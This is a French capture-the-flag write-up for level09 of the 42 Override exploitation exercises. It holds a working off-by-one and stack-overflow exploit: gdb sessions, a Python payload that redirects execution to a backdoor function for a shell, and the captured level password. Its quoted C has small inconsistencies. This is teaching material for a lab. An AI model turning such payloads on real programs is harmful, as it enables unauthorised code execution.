# Override

Override 42 security level09

On nous demande un username et un message a envoyé.

En regardant l'assembleur, on remarque une fonciton non appelée (secret_backdoor) qui appelle un shellcode.
On comprend donc que notre objectif va etre de l'appeller.
On observe que le programme rempli une structure avec 2 fonctions:
set_msg
set_username

Ce sont donc nos point d'entrée dans le programme.
La fonction set_msg semble inattaquable, elle utilise strncpy avec la bonne taille, l'overflow semble impossible.
En revanche la fonction set_username semble être exploitable.
Effectivement elle utilise une boucle afin de remplir la structure.

```c
void set_username(msg_t *msg)
{
  char    buffer[128];
  int  i;
  
  bzero(buffer, 1128);
  puts(">: Enter your username");
  printf(">>: ");
  fgets(buffer, 128, stdin);
  i = 0;
  while (i <= 40 && buffer[i] != 0)
  {
    message->username[i] = buffer[i];
    i++;
  }

  printf(">: Welcome, %s", message->username);
}

```
Hors on se souvient:
```c
  char    username[40];
```

Donc notre boucle tourne 41 fois alors que la taille de l'username n'est que de 40.
On a donc localise l'overflow.
On va utiliser l'overflow de 1 pour modifier la variable suivante : len_message.
Qui controle elle le strncpy sur la fonction set_msg
Si on remplace le nombre par un nombre plus gros le strncpy va overflow et donc nous permettra d'avoir de l'espace pour faire notre exploit.
On va utiliser le caractere le plus grand que l'on puisse : \xff -> 255

```
gdb ./level09
r <<<$(python -c 'print "A" * 40 + "\xff" + "\n" + "B" * 255')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```

On remarque bien une segfalt.

```
gdb ./level09
shell python -c 'print "A" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"' > /tmp/test1
r < /tmp/test1
Starting program: /home/users/level09/level09 < /tmp/test1
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x4138674137674136 in ?? ()
(gdb) info registers
rax            0xd	13
rbx            0x0	0
rcx            0x7ffff7b01f90	140737348902800
rdx            0x7ffff7dd5a90	140737351867024
rsi            0x7ffff7ff7000	140737354100736
rdi            0xffffffff	4294967295
rbp            0x6741356741346741	0x6741356741346741
rsp            0x7fffffffe590	0x7fffffffe590
r8             0x7ffff7ff7004	140737354100740
r9             0xc	12
r10            0x7fffffffde30	140737488346672
r11            0x246	582
r12            0x555555554790	93824992233360
r13            0x7fffffffe670	140737488348784
r14            0x0	0
r15            0x0	0
rip            0x4138674137674136	0x4138674137674136
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0

x/s $rsp
0x7fffffffe590:	 "g9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"
(gdb) shell echo -n "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8A" | wc -c
208
```
Enfin 208 - 8 = 200 donc on a une EIP à 200 !
Trouvons l'adresse de la secret backdoor:

```
gdb ./level09
(gdb) b * main
Breakpoint 1 at 0xaa8
(gdb) r
Starting program: /home/users/level09/level09

Breakpoint 1, 0x0000555555554aa8 in main ()
(gdb) x secret_backdoor
0x55555555488c <secret_backdoor>:	0xe5894855
```

On va donc construire notre exploit :

```
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff" + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat .pass
cat: .pass: Permission denied
../.pass
/bin/sh: 3: ../.pass: Permission denied
cat ../end/.pass
cat: ../end/.pass: Permission denied
cd ..
cat .pass
cat: .pass: No such file or directory
cd end
cat .pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
